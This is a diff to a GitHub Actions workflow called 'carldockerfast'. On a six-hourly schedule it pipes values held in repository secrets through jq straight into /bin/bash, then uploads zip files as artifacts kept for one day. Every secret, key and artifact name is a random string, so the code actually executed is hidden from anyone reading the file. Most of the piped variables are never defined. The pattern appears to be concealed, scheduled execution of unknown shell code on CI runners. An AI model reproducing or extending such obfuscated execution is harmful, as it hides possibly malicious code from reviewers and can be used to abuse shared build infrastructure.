@@ -1,9 +1,9 @@
 name: carldockerfast
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '42 3/6 * * *'
+    - cron: '3 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: carldockerfast
         env:
-          b3477: ${{ secrets.b3477 }}
+          bjp31844: ${{ secrets.bjp31844 }}
         run: |
-          echo $b3477 | jq -r .p42906 | /bin/bash
-          echo $xrbwd1 | jq -r .zsq93055 | /bin/bash
-          echo $hvpgi7 | jq -r .arb8622 | /bin/bash
-          echo $sr16059 | jq -r .vot20762 | /bin/bash
-          echo $leya243 | jq -r .i7 | /bin/bash
-          echo $cwfx937 | jq -r .cwtq50079 | /bin/bash
-          echo $gcj59919 | jq -r .chad947 | /bin/bash
-          echo $at753 | jq -r .lmur3 | /bin/bash
-          echo $g19782 | jq -r .t4 | /bin/bash
-          echo $dh5 | jq -r .iv753 | /bin/bash
-          echo $bq50168 | jq -r .f33027 | /bin/bash
+          printf '%s' "$bjp31844" | jq -r .zqd911 | /bin/bash
+          echo $mkc4 | jq -r .ixhr775 | /bin/bash
+          printf '%s' "$mx9" | jq -r .ezxxw27858 | /bin/bash
+          echo $pcw9 | jq -r .avcqc2 | /bin/bash
+          echo $ghin70754 | jq -r .myajf6 | /bin/bash
+          printf '%s' "$v5" | jq -r .vcc221 | /bin/bash
+          echo $pirnh24268 | jq -r .i3093 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Mc3lqeT6
+          path: "*.zip"
+          retention-days: 1
